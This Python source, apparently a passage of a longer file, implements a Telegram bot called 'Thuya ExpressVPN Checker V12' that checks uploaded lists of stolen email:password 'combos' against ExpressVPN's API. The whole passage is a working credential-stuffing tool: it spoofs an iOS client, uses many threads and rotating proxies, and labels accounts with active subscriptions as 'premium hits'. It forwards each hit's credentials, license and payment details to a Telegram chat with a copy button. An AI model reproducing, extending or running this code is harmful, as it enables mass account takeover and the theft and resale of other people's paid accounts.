    sub_preview = sub_body[:500] if sub_body else "(empty)"

    # Portal API ကိုတစ်ခါတည်းဖတ်ပြီး License + missing fields တွေ fallback ယူမယ်။
    portal_details = extract_portal_details(access_token)
    license_key = portal_details.get("license", "")

    # Treat HTTP / transport errors as fail, NOT free. License ရှိရင် direct subscription endpoint နဲ့ fields ထပ်ယူမယ်။
    if sub_status != 200 or not sub_body:
        if license_key:
            direct_details = {}
            try:
                direct_url = (
                    f"{API_HOST}/apis/v2/subscription?access_token={access_token}"
                    f"&client_version=11.5.2&installation_id={install_id}"
                    f"&os_name=ios&os_version=14.4&reason=activation_with_email"
                )
                direct_headers = {
                    "User-Agent": USER_AGENT,
                    "Expect": "",
                    "X-Signature": sub_sig,
                    "Accept-Language": "en",
                    "Accept-Encoding": "gzip, deflate",
                }
                rd = http_get(direct_url, headers=direct_headers, timeout=30)
                if rd.status_code == 200 and rd.text:
                    direct_details = extract_subscription_details(parse_possible_json(rd.text), rd.text)
            except Exception:
                direct_details = {}
            details = merge_details(direct_details, portal_details)
            status = account_status_from_details(details)
            return {
                "status": status, "email": email, "password": password,
                "license": license_key,
                "plan": details.get("plan", "?"),
                "expire": details.get("expire", "?"),
                "days_left": details.get("days_left", 0),
                "auto_renew": details.get("auto_renew", "?"),
                "payment": details.get("payment", "?"),
            }
        return {"status": "fail", "email": email, "password": password,
                "error": f"sub_http_{sub_status}", "debug": sub_preview}

    # ---- Robust JSON parsing of batch response ----
    # Batch response can be normal JSON, JSON-in-JSON, or double-escaped text.
    sub_data = parse_possible_json(sub_body)
    if isinstance(sub_data, list) and sub_data:
        inner = sub_data[0]
        if isinstance(inner, dict) and "body" in inner:
            sub_data = parse_possible_json(inner.get("body"))

    batch_details = extract_subscription_details(sub_data, sub_body)

    # Some API versions return only status/license in batch; try direct subscription once before giving up.
    if not batch_details.get("has_sub_data"):
        try:
            direct_url = (
                f"{API_HOST}/apis/v2/subscription?access_token={access_token}"
                f"&client_version=11.5.2&installation_id={install_id}"
                f"&os_name=ios&os_version=14.4&reason=activation_with_email"
            )
            direct_headers = {
                "User-Agent": USER_AGENT,
                "Expect": "",
                "X-Signature": sub_sig,
                "Accept-Language": "en",
                "Accept-Encoding": "gzip, deflate",
            }
            rd = http_get(direct_url, headers=direct_headers, timeout=30)
            if rd.status_code == 200 and rd.text:
                direct_data = parse_possible_json(rd.text)
                direct_details = extract_subscription_details(direct_data, rd.text)
                batch_details = merge_details(batch_details, direct_details)
                batch_details["has_sub_data"] = batch_details.get("has_sub_data") or direct_details.get("has_sub_data")
                batch_details["explicit_free"] = batch_details.get("explicit_free") or direct_details.get("explicit_free")
        except Exception:
            pass

    details = merge_details(batch_details, portal_details)
    has_sub_data = batch_details.get("has_sub_data") or any(details.get(k) != "?" for k in ("plan", "expire", "auto_renew", "payment"))
    explicit_free = batch_details.get("explicit_free") and not has_sub_data

    # Only mark free if truly no data AND no license
    if explicit_free and not license_key and not has_sub_data:
        return {"status": "free", "email": email, "password": password,
                "reason": "no_active_sub", "debug": sub_preview}

    status = account_status_from_details(details)

    return {
        "status": status,
        "email": email,
        "password": password,
        "license": license_key or "N/A",
        "plan": details.get("plan", "?"),
        "expire": details.get("expire", "?"),
        "days_left": details.get("days_left", 0),
        "auto_renew": details.get("auto_renew", "?"),
        "payment": details.get("payment", "?"),
    }


# ============================================================
# UI / TELEGRAM
# ============================================================

BRAND      = "❤️ 𝗧𝗵𝘂𝘆𝗮 𝗘𝘅𝗽𝗿𝗲𝘀𝘀𝗩𝗣𝗡 𝗖𝗵𝗲𝗰𝗸𝗲𝗿 𝗩𝟭𝟮"
LINE       = "━━━━━━━━━━━━━━━━━━━━━━━━"
BATCH_SIZE = 500   # Hit message ပို့မယ့် batch size


def fmt_hit(d: dict) -> str:
    """Premium Hit — user's preferred style."""
    dl = d.get('days_left', 0)
    if not isinstance(dl, int):
        dl = 0
    proxy_line = ""
    if d.get("proxy"):
        proxy_line = f"║🌐 <b>Proxy</b>    ➜  <code>{d['proxy']}</code> 🔒\n"
    return (
        f"🏆 <b>𝗣𝗥𝗘𝗠𝗜𝗨𝗠 𝗛𝗜𝗧</b> 🏆\n"
        f"╔════════════════════════════╗\n"
        f"║📧 <code>{d['email']}:{d['password']}</code>\n"
        f"║🔑 <b>License</b>  ➜  <code>{d['license']}</code>\n"
        f"║📅 <b>Plan</b>     ➜  {d['plan']}\n"
        f"║⏳ <b>Expire</b>   ➜  {d['expire']}  (<b>{dl}d</b>) {days_emoji(dl)}\n"
        f"║🔄 <b>Renew</b>    ➜  {d['auto_renew']}\n"
        f"║💳 <b>Payment</b>  ➜  {d['payment']}\n"
        f"{proxy_line}"
        f"╚════════════════════════════╝"
    )


def fmt_expired(d: dict) -> str:
    """Expired / Free account."""
    dl = d.get('days_left', 0)
    if not isinstance(dl, int):
        dl = 0
    proxy_line = ""
    if d.get("proxy"):
        proxy_line = f"║🌐 <b>Proxy</b>    ➜  <code>{d.get('proxy','')} </code>\n"
    return (
        f"👤 <b>𝗙𝗥𝗘𝗘 𝗔𝗖𝗖𝗢𝗨𝗡𝗧</b>\n"
        f"╔════════════════════════════╗\n"
        f"║📧 <code>{d['email']}:{d['password']}</code>\n"
        f"║🔑 <b>License</b>  ➜  <code>{d.get('license','N/A')}</code>\n"
        f"║📅 <b>Plan</b>     ➜  {d.get('plan','?')}\n"
        f"║⏳ <b>Expired</b>  ➜  {d.get('expire','?')}  (<b>{dl}d</b>) 🔴\n"
        f"║💳 <b>Payment</b>  ➜  {d.get('payment','?')}\n"
        f"{proxy_line}"
        f"╚════════════════════════════╝"
    )


def send_hit_message(chat_id, text: str, combo: str):
    """Send hit message with copy_text button via raw Bot API (guaranteed clipboard copy)."""
    import requests as _req
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": chat_id,
        "text": text,
        "parse_mode": "HTML",
        "reply_markup": {
            "inline_keyboard": [[
                {"text": "📋 Copy Combo", "copy_text": {"text": combo}}
            ]]
        }
    }
    try:
        r = _req.post(url, json=payload, timeout=30)
        if not r.ok:
            print(f"[SEND HIT] API error: {r.status_code} {r.text[:200]}")
    except Exception as e:
        print(f"[SEND HIT] Exception: {e}")


bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")
sessions = {}   # uid -> session dict
sess_lock = threading.Lock()
hit_store = {}  # uid -> list of hit dicts (accumulated until batch flush)
expired_store = {}  # uid -> list of expired/free account dicts


def new_session(total: int) -> dict:
    return {
        "hits": 0, "free": 0, "fails": 0, "expired": 0,
        "total": total, "done": 0, "cancel": False,
        "running": False, "last_flush": 0,
    }


def is_admin(uid: int) -> bool:
    return uid in ADMIN_IDS


def main_menu_kb():
    """Inline keyboard for /start menu."""
    kb = types.InlineKeyboardMarkup(row_width=2)
    kb.add(
        types.InlineKeyboardButton("📊 Stats", callback_data="stats"),
        types.InlineKeyboardButton("⚡ Hits", callback_data="hits"),
    )
    kb.add(
        types.InlineKeyboardButton("⚙️ Threads", callback_data="threads"),
        types.InlineKeyboardButton("🗑 Clear", callback_data="clear"),
    )
    kb.add(
        types.InlineKeyboardButton("🌐 Proxy", callback_data="proxy"),
        types.InlineKeyboardButton("🛑 Stop", callback_data="stop"),
    )
    return kb


def thread_kb():
    """Inline keyboard to change thread count."""
    kb = types.InlineKeyboardMarkup(row_width=3)
    kb.add(
        types.InlineKeyboardButton("5", callback_data="set_t_5"),
        types.InlineKeyboardButton("10", callback_data="set_t_10"),
        types.InlineKeyboardButton("20", callback_data="set_t_20"),
    )
    kb.add(
        types.InlineKeyboardButton("50", callback_data="set_t_50"),
        types.InlineKeyboardButton("100", callback_data="set_t_100"),
        types.InlineKeyboardButton("🔙 Back", callback_data="back"),
    )
    return kb


def proxy_menu_kb():
    """Main proxy submenu."""
    kb = types.InlineKeyboardMarkup(row_width=2)
    kb.add(
        types.InlineKeyboardButton("➕ Add Proxy", callback_data="px_add"),
        types.InlineKeyboardButton("📋 List", callback_data="px_list"),
    )
    kb.add(
        types.InlineKeyboardButton("🗑 Remove", callback_data="px_remove"),
        types.InlineKeyboardButton("💣 Clear All", callback_data="px_clear"),
    )
    kb.add(
        types.InlineKeyboardButton("🧪 Test All", callback_data="px_test"),
    )
    kb.add(
        types.InlineKeyboardButton("🔙 Back", callback_data="back"),
    )
    return kb


def proxy_type_kb():
    """Type selector when adding."""
    kb = types.InlineKeyboardMarkup(row_width=2)
    kb.add(
        types.InlineKeyboardButton("HTTP", callback_data="px_type_http"),
        types.InlineKeyboardButton("HTTPS", callback_data="px_type_https"),
    )
    kb.add(
        types.InlineKeyboardButton("SOCKS4", callback_data="px_type_socks4"),
        types.InlineKeyboardButton("SOCKS5", callback_data="px_type_socks5"),
    )
    kb.add(
        types.InlineKeyboardButton("❌ Cancel", callback_data="px_cancel"),
    )
    return kb


def proxy_remove_kb():
    """List proxies as remove buttons."""
    kb = types.InlineKeyboardMarkup(row_width=1)
    if not PROXIES:
        kb.add(types.InlineKeyboardButton("(no proxies)", callback_data="px_noop"))
    else:
        for i, p in enumerate(PROXIES):
            label = f"❌ {i+1}. {_proxy_label(p)}"
            if len(label) > 60:
                label = label[:57] + "…"
            kb.add(types.InlineKeyboardButton(label, callback_data=f"px_rm_{i}"))
    kb.add(types.InlineKeyboardButton("🔙 Back", callback_data="proxy"))
    return kb


# ---------- /start ----------
@bot.message_handler(commands=["start"])
def cmd_start(m):
    if not is_admin(m.from_user.id):
        bot.reply_to(m, "🚫 Private bot — admin only.")
        return
    bot.send_message(
        m.chat.id,
        f"{BRAND}\n{LINE}\n"
        f"👋 <b>Welcome Admin</b>\n\n"
        f"📤  Combo file (.txt) တင်ပါ\n"
        f"⚙️  Threads     ➜  <b>{MAX_THREADS}</b>\n"
        f"📦  Batch flush ➜  <b>{BATCH_SIZE}</b> checks\n"
        f"{LINE}\n"
        f"<i>Tap a button below to begin.</i>",
        reply_markup=main_menu_kb(),
    )


# ---------- Callback query handler ----------
@bot.callback_query_handler(func=lambda c: True)
def on_callback(call):
    uid = call.from_user.id
    global MAX_THREADS
    if not is_admin(uid):
        bot.answer_callback_query(call.id, "🚫 Admin only")
        return

    data = call.data

    # --- Stats ---
    if data == "stats":
        s = sessions.get(uid)
        if not s:
            bot.answer_callback_query(call.id, "📊 No active session")
            return
        bot.answer_callback_query(call.id)
        pct = (s['done'] * 100 // s['total']) if s['total'] else 0
        bar = "█" * (pct // 5) + "░" * (20 - pct // 5)
        bot.send_message(
            call.message.chat.id,
            f"{BRAND}\n{LINE}\n"
            f"📊 <b>Live Stats</b>  •  {'🟢 Running' if s['running'] else '🔴 Stopped'}\n\n"
            f"<code>{bar}</code>  {pct}%\n"
            f"📦  Progress  ➜  <b>{s['done']}/{s['total']}</b>\n"
            f"✅  Hits      ➜  <b>{s['hits']}</b>\n"
            f"👤  Free      ➜  <b>{s['free']}</b>\n"
            f"⌛  Expired   ➜  <b>{s.get('expired', 0)}</b>\n"
            f"❌  Fail      ➜  <b>{s['fails']}</b>\n"
            f"⚙️  Threads   ➜  <b>{MAX_THREADS}</b>\n{LINE}",
            reply_markup=main_menu_kb(),
        )

    # --- Hits (show all accumulated hits) ---
    elif data == "hits":
        stored = hit_store.get(uid, [])
        premium = [h for h in stored if account_status_from_details(h) == "hit"]
        expired = [h for h in stored if account_status_from_details(h) == "expired"]
        if expired:
            hit_store[uid] = premium
            expired_store.setdefault(uid, []).extend(expired)
        stored = premium
        if not stored:
            bot.answer_callback_query(call.id, "⚡ No premium hits yet")
            return
        bot.answer_callback_query(call.id)
        # Show last 10 hits max to avoid message length issues
        show = stored[-10:]
        text = f"{BRAND}\n{LINE}\n🏆 <b>Last {len(show)} Premium Hits</b>\n{LINE}\n\n"
        for h in show:
            text += fmt_hit(h) + "\n\n"
        text += f"📊 <b>Total Hits:</b> {len(stored)}"
        # Split if too long
        if len(text) > 4000:
            text = text[:4000] + "\n\n... (truncated)"
        bot.send_message(call.message.chat.id, text)

    # --- Threads ---
    elif data == "threads":
        bot.answer_callback_query(call.id)
        bot.edit_message_text(
            f"{BRAND}\n{LINE}\n"
            f"⚙️ <b>Thread Settings</b>\n\n"
            f"Current ➜ <b>{MAX_THREADS}</b>\n\n"
            f"<i>အသုံးပြုလိုသော thread အရေအတွက် ရွေးပါ</i>",
            call.message.chat.id, call.message.message_id,
            reply_markup=thread_kb(),
        )

    elif data.startswith("set_t_"):
        MAX_THREADS = int(data.split("_")[-1])
        bot.answer_callback_query(call.id, f"✅ Threads → {MAX_THREADS}")
        bot.edit_message_text(
            f"{BRAND}\n{LINE}\n"
            f"⚙️  Threads updated ➜ <b>{MAX_THREADS}</b>\n{LINE}",
            call.message.chat.id, call.message.message_id,
            reply_markup=main_menu_kb(),
        )

    # --- Clear ---
    elif data == "clear":
        with sess_lock:
            sessions.pop(uid, None)
            hit_store.pop(uid, None)
            expired_store.pop(uid, None)
        bot.answer_callback_query(call.id, "🗑 Cleared!")
        bot.edit_message_text(
            f"{BRAND}\n{LINE}\n"
            f"🗑  <b>Cleared!</b>\n"
            f"Session & Hits တွေ အကုန် ဖျက်ပြီးပါပြီ။\n{LINE}",
            call.message.chat.id, call.message.message_id,
            reply_markup=main_menu_kb(),
        )

    # --- Stop ---
    elif data == "stop":
        if uid in sessions:
            sessions[uid]["cancel"] = True
            bot.answer_callback_query(call.id, "🛑 Stopping...")
        else:
            bot.answer_callback_query(call.id, "No active session")

    # --- Back ---
    elif data == "back":
        bot.answer_callback_query(call.id)
        bot.edit_message_text(
            f"{BRAND}\n{LINE}\n"
            f"👋 <b>Welcome Admin</b>\n\n"
            f"📤  Combo file (.txt) တင်ပါ\n"
            f"⚙️  Threads     ➜  <b>{MAX_THREADS}</b>\n"
            f"📦  Batch flush ➜  <b>{BATCH_SIZE}</b> checks\n"
            f"{LINE}",
            call.message.chat.id, call.message.message_id,
            reply_markup=main_menu_kb(),
        )

    # ============= PROXY MENU =============
    elif data == "proxy":
        bot.answer_callback_query(call.id)
        PROXY_PENDING.pop(uid, None)
        bot.edit_message_text(
            f"{BRAND}\n{LINE}\n"
            f"🌐 <b>Proxy Manager</b>\n\n"
            f"📦  Loaded ➜ <b>{len(PROXIES)}</b> proxy(s)\n"
            f"🔁  Mode   ➜  Random rotate per request\n"
            f"{LINE}",
            call.message.chat.id, call.message.message_id,
            reply_markup=proxy_menu_kb(),
        )

    elif data == "px_add":
        bot.answer_callback_query(call.id)
        PROXY_PENDING[uid] = {"step": "type"}
        bot.edit_message_text(
            f"{BRAND}\n{LINE}\n"
            f"➕ <b>Add Proxy — Step 1/2</b>\n\n"
            f"Proxy type ကို ရွေးပါ။\n{LINE}",
            call.message.chat.id, call.message.message_id,
            reply_markup=proxy_type_kb(),
        )

    elif data.startswith("px_type_"):
        ptype = data.replace("px_type_", "")
        PROXY_PENDING[uid] = {"step": "string", "type": ptype}
        bot.answer_callback_query(call.id, f"Type ➜ {ptype.upper()}")
        socks_warn = ""
        if ptype.startswith("socks") and not _SOCKS_AVAILABLE:
            socks_warn = (
                f"\n⚠️ <b>PySocks မရှိ!</b>\n"
                f"Server မှာ <code>pip install PySocks</code> သို့မဟုတ် "
                f"<code>pip install requests[socks]</code> run လုပ်ပြီး bot ပြန် start ပါ။\n"
            )
        bot.edit_message_text(
            f"{BRAND}\n{LINE}\n"
            f"➕ <b>Add Proxy — Step 2/2</b>\n\n"
            f"Type ➜ <b>{ptype.upper()}</b>{socks_warn}\n"
            f"အောက်ပါ format တစ်ခုခုနဲ့ proxy ပို့ပါ:\n"
            f"<code>host:port</code>\n"
            f"<code>host:port:user:pass</code>\n"
            f"<code>user:pass@host:port</code>\n\n"
            f"<i>ဥပမာ:</i>\n"
            f"<code>proxy.geonode.io:11000:user-xxx:password</code>\n\n"
            f"❌ ဖျက်ချင်ရင် /cancel ရိုက်ပါ။\n{LINE}",
            call.message.chat.id, call.message.message_id,
        )

    elif data == "px_cancel":
        PROXY_PENDING.pop(uid, None)
        bot.answer_callback_query(call.id, "Cancelled")
        bot.edit_message_text(
            f"{BRAND}\n{LINE}\n🌐 <b>Proxy Manager</b>\n\n"
            f"📦 Loaded ➜ <b>{len(PROXIES)}</b>\n{LINE}",
            call.message.chat.id, call.message.message_id,
            reply_markup=proxy_menu_kb(),
        )

    elif data == "px_list":
        bot.answer_callback_query(call.id)
        if not PROXIES:
            txt = f"{BRAND}\n{LINE}\n📋 <b>Proxy List</b>\n\n<i>Empty.</i>\n{LINE}"
        else:
            lines = [f"<b>{i+1}.</b> <code>{_proxy_label(p)}</code>" for i, p in enumerate(PROXIES)]
            txt = f"{BRAND}\n{LINE}\n📋 <b>Proxy List ({len(PROXIES)})</b>\n\n" + "\n".join(lines) + f"\n{LINE}"
        if len(txt) > 3900:
            txt = txt[:3900] + "\n…(truncated)"
        bot.edit_message_text(
            txt, call.message.chat.id, call.message.message_id,
            reply_markup=proxy_menu_kb(),
        )

    elif data == "px_remove":
        bot.answer_callback_query(call.id)
        bot.edit_message_text(
            f"{BRAND}\n{LINE}\n🗑 <b>Remove Proxy</b>\n\n"
            f"ဖျက်လိုသော proxy ကို နှိပ်ပါ။\n{LINE}",
            call.message.chat.id, call.message.message_id,
            reply_markup=proxy_remove_kb(),
        )

    elif data.startswith("px_rm_"):
        try:
            idx = int(data.replace("px_rm_", ""))
        except ValueError:
            idx = -1
        ok = remove_proxy(idx)
        bot.answer_callback_query(call.id, "🗑 Removed" if ok else "Not found")
        bot.edit_message_text(
            f"{BRAND}\n{LINE}\n🗑 <b>Remove Proxy</b>\n\n"
            f"📦 Remaining ➜ <b>{len(PROXIES)}</b>\n{LINE}",
            call.message.chat.id, call.message.message_id,
            reply_markup=proxy_remove_kb(),
        )

    elif data == "px_clear":
        clear_proxies()
        bot.answer_callback_query(call.id, "💣 All cleared")
        bot.edit_message_text(
            f"{BRAND}\n{LINE}\n🌐 <b>Proxy Manager</b>\n\n"
            f"📦 Loaded ➜ <b>{len(PROXIES)}</b>\n{LINE}",
            call.message.chat.id, call.message.message_id,
            reply_markup=proxy_menu_kb(),
        )

    elif data == "px_noop":
        bot.answer_callback_query(call.id)

    elif data == "px_test":
        bot.answer_callback_query(call.id, "🧪 Testing…")
        if not PROXIES:
            bot.edit_message_text(
                f"{BRAND}\n{LINE}\n🧪 <b>Proxy Test</b>\n\n<i>No proxies to test.</i>\n{LINE}",
                call.message.chat.id, call.message.message_id,
                reply_markup=proxy_menu_kb(),
            )
            return

        chat_id = call.message.chat.id
        msg_id = call.message.message_id

        def _run_test():
            # Snapshot proxies to avoid races with edits
            with _proxy_lock:
                snap = list(PROXIES)
            # Initial status
            try:
                bot.edit_message_text(
                    f"{BRAND}\n{LINE}\n🧪 <b>Testing {len(snap)} proxy(s)…</b>\n\n"
                    f"<i>Hitting {PROXY_TEST_URL} via each proxy</i>\n{LINE}",
                    chat_id, msg_id,
                )
            except Exception:
                pass

            # Concurrent test
            from concurrent.futures import ThreadPoolExecutor as _TPE
            results = [None] * len(snap)
            def _w(i_p):
                i, p = i_p
                results[i] = (p, test_one_proxy(p))
            with _TPE(max_workers=min(20, max(1, len(snap)))) as ex:
                list(ex.map(_w, list(enumerate(snap))))

            ok = sum(1 for r in results if r and r[1]["ok"])
            bad = len(results) - ok

            lines = [f"{BRAND}\n{LINE}\n🧪 <b>Proxy Test Result</b>\n",
                     f"✅ Live ➜ <b>{ok}</b>     ❌ Dead ➜ <b>{bad}</b>", LINE, ""]
            for i, item in enumerate(results, 1):
                if not item:
                    continue
                p, r = item
                head = f"<b>{i}.</b> <code>{_proxy_label(p)}</code>"
                if r["ok"]:
                    lines.append(f"{head}\n   ✅ <b>LIVE</b> • IP <code>{r['ip']}</code> • {r['latency']}ms")
                else:
                    lines.append(f"{head}\n   ❌ <b>DEAD</b> • {r['error']} • {r['latency']}ms")
            lines.append(LINE)
            txt = "\n".join(lines)
            if len(txt) > 3900:
                txt = txt[:3900] + "\n…(truncated)"
            try:
                bot.edit_message_text(
                    txt, chat_id, msg_id,
                    reply_markup=proxy_menu_kb(),
                )
            except Exception:
                bot.send_message(chat_id, txt, reply_markup=proxy_menu_kb())

        threading.Thread(target=_run_test, daemon=True).start()


# ---------- Text handler for proxy input ----------
@bot.message_handler(func=lambda m: m.from_user.id in PROXY_PENDING and PROXY_PENDING[m.from_user.id].get("step") == "string", content_types=["text"])
def on_proxy_text(m):
    uid = m.from_user.id
    if not is_admin(uid):
        return
    text = (m.text or "").strip()
    if text.lower() in ("/cancel", "cancel"):
        PROXY_PENDING.pop(uid, None)
        bot.reply_to(m, "❌ Cancelled.", reply_markup=proxy_menu_kb())
        return
    pending = PROXY_PENDING.get(uid, {})
    ptype = pending.get("type", "http")
    added = 0
    failed = 0
    # Allow multi-line bulk add
    for raw in text.splitlines():
        raw = raw.strip()
        if not raw:
            continue
        p = parse_proxy_string(raw, ptype)
        if p:
            add_proxy(p)
            added += 1
        else:
            failed += 1
    PROXY_PENDING.pop(uid, None)
    bot.reply_to(
        m,
        f"{BRAND}\n{LINE}\n"
        f"✅ <b>Proxy Added</b>\n\n"
        f"➕ Added   ➜ <b>{added}</b>\n"
        f"❌ Failed  ➜ <b>{failed}</b>\n"
        f"📦 Total   ➜ <b>{len(PROXIES)}</b>\n{LINE}",
        reply_markup=proxy_menu_kb(),
    )


# ---------- Combo file handler ----------
@bot.message_handler(content_types=["document"])
def on_combo(m):
    uid = m.from_user.id
    if not is_admin(uid):
        return

    # Check if already running
    if uid in sessions and sessions[uid].get("running"):
        bot.reply_to(m, "⚠️ Session already running! /stop first.")
        return

    try:
        info = bot.get_file(m.document.file_id)
        raw  = bot.download_file(info.file_path).decode("utf-8", "ignore")
    except Exception as e:
        bot.reply_to(m, f"❌ Download error: {e}")
        return

    combos = [l.strip() for l in raw.splitlines() if ":" in l]
    if not combos:
        bot.reply_to(m, "❌ Empty / invalid combo.")
        return

    with sess_lock:
        sessions[uid] = new_session(len(combos))
        sessions[uid]["running"] = True
        hit_store[uid] = []
        expired_store[uid] = []

    status = bot.send_message(
        m.chat.id,
        f"{BRAND}\n{LINE}\n"
        f"🚀 <b>Checking Started</b>\n\n"
        f"📦  Combos   ➜  <b>{len(combos)}</b>\n"
        f"⚙️  Threads  ➜  <b>{MAX_THREADS}</b>\n"
        f"📤  Flush    ➜  every <b>{BATCH_SIZE}</b> checks\n"
        f"{LINE}",
        reply_markup=main_menu_kb(),
    )

    def flush_hits(chat_id, uid_):
        """Send each hit/free as individual message with clipboard copy button."""
        # Send premium hits only when expire date is still valid
        stored = hit_store.get(uid_, [])
        premium_hits = []
        moved_expired = []
        for h in stored:
            if account_status_from_details(h) == "expired":
                moved_expired.append(h)
            else:
                premium_hits.append(h)
        for h in premium_hits:
            text = f"{BRAND}\n{LINE}\n{fmt_hit(h)}\n{LINE}\n❤️ <i>Thuya ExpressVPN Checker V12</i>"
            combo = f"{h['email']}:{h['password']}"
            send_hit_message(chat_id, text, combo)

        # Free / Expired accounts: count only, do NOT send any message (per user request)

    def worker(line):
        with sess_lock:
            if sessions[uid]["cancel"]:
                return
        try:
            email, pwd = line.split(":", 1)
        except ValueError:
            with sess_lock:
                sessions[uid]["done"] += 1
                sessions[uid]["fails"] += 1
            return
        reset_thread_proxy()
        try:
            res = check_account(email.strip(), pwd.strip())
        except Exception as e:
            res = {"status": "fail", "error": str(e)}
            print(f"[DEBUG EXCEPTION] {email}: {e}")
        # Attach proxy used (if any) for this account check
        used = get_thread_proxy()
        if isinstance(res, dict):
            res["proxy"] = _proxy_label(used) if used else ""

        with sess_lock:
            s = sessions[uid]
            s["done"] += 1

            if res["status"] == "hit":
                s["hits"] += 1
                hit_store.setdefault(uid, []).append(res)
            elif res["status"] == "free":
                s["free"] += 1
            elif res["status"] == "expired":
                # Treat expired subscriptions as free accounts
                s["free"] += 1
                s["expired"] = s.get("expired", 0) + 1
                expired_store.setdefault(uid, []).append(res)
            else:
                s["fails"] += 1
                # Print first 20 fails for debugging
                if s["fails"] <= 20:
                    print(f"[DEBUG FAIL] {email}: {res.get('error', 'unknown')}")

            # Flush hits every BATCH_SIZE checks
            if s["done"] - s["last_flush"] >= BATCH_SIZE:
                s["last_flush"] = s["done"]
                flush_hits(HIT_CHAT, uid)
                hit_store[uid] = []
                expired_store[uid] = []

            # Live status update every 50 done
            if s["done"] % 1000 == 0 or s["done"] == s["total"]:
                try:
                    pct = (s['done'] * 100 // s['total']) if s['total'] else 0
                    bar = "█" * (pct // 5) + "░" * (20 - pct // 5)
                    bot.edit_message_text(
                        f"{BRAND}\n{LINE}\n"
                        f"🔄 <b>Checking...</b>\n\n"
                        f"<code>{bar}</code>  {pct}%\n"
                        f"📦  Progress  ➜  <b>{s['done']}/{s['total']}</b>\n"
                        f"✅  Hits      ➜  <b>{s['hits']}</b>\n"
                        f"👤  Free      ➜  <b>{s['free']}</b>\n"
                        f"⌛  Expired   ➜  <b>{s.get('expired', 0)}</b>\n"
                        f"❌  Fail      ➜  <b>{s['fails']}</b>\n"
                        f"⚙️  Threads   ➜  <b>{MAX_THREADS}</b>\n{LINE}",
                        m.chat.id, status.message_id,
                        reply_markup=main_menu_kb(),
                    )
                except Exception:
                    pass

    def runner():
        # Bounded queue: don't pre-submit 100k tasks at once.
        from collections import deque
        with ThreadPoolExecutor(max_workers=MAX_THREADS) as ex:
            inflight = deque()
            it = iter(combos)
            # prime
            for _ in range(MAX_THREADS * 4):
                try:
                    inflight.append(ex.submit(worker, next(it)))
                except StopIteration:
                    break
            for line in it:
                with sess_lock:
                    if sessions[uid]["cancel"]:
                        break
                # wait for at least one to finish before submitting more
                fut = inflight.popleft()
                try:
                    fut.result()
                except Exception:
                    pass
                inflight.append(ex.submit(worker, line))
            # drain
            for fut in inflight:
                try:
                    fut.result()
                except Exception:
                    pass

        # Final flush — remaining hits + expired ပို့
        flush_hits(HIT_CHAT, uid)
        hit_store[uid] = []
        expired_store[uid] = []

        s = sessions[uid]
        s["running"] = False
        bot.send_message(
            m.chat.id,
            f"{BRAND}\n{LINE}\n"
            f"🎉 <b>Checking Finished!</b>\n\n"
            f"📦  Total  ➜  <b>{s['total']}</b>\n"
            f"✅  Hits   ➜  <b>{s['hits']}</b>\n"
            f"👤  Free   ➜  <b>{s['free']}</b>\n"
            f"⌛  Expired ➜  <b>{s.get('expired', 0)}</b>\n"
            f"❌  Fail   ➜  <b>{s['fails']}</b>\n"
            f"{LINE}\n"
            f"❤️ <i>Thuya ExpressVPN Checker V12</i>",
            reply_markup=main_menu_kb(),
        )

    threading.Thread(target=runner, daemon=True).start()


# ---------- /stop command ----------
@bot.message_handler(commands=["stop"])
def cmd_stop(m):
    if not is_admin(m.from_user.id):
        return
    if m.from_user.id in sessions:
        sessions[m.from_user.id]["cancel"] = True
        bot.reply_to(m, "🛑 Stopping…")
    else:
        bot.reply_to(m, "❌ No active session.")


# ============================================================
# RUN
# ============================================================
if __name__ == "__main__":
    print(f"{BRAND}")
    print(f"Threads: {MAX_THREADS} | Admins: {ADMIN_IDS}")
    print(f"Batch size: {BATCH_SIZE}")

    import time
    print("Starting polling…")
    try:
        bot.remove_webhook(drop_pending_updates=True)
    except Exception:
        pass

    print("Polling…")
    while True:
        try:
            bot.infinity_polling(timeout=30, long_polling_timeout=30)
        except telebot.apihelper.ApiTelegramException as e:
            if "409" in str(e):
                print("⚠️ 409 Conflict — another copy of this bot is still running. Stop the other process, waiting 30s…")
                time.sleep(30)
                continue
            raise
        except Exception as e:
            print(f"⚠️ Error: {e} — retrying in 5s…")
            time.sleep(5)
            continue
        break
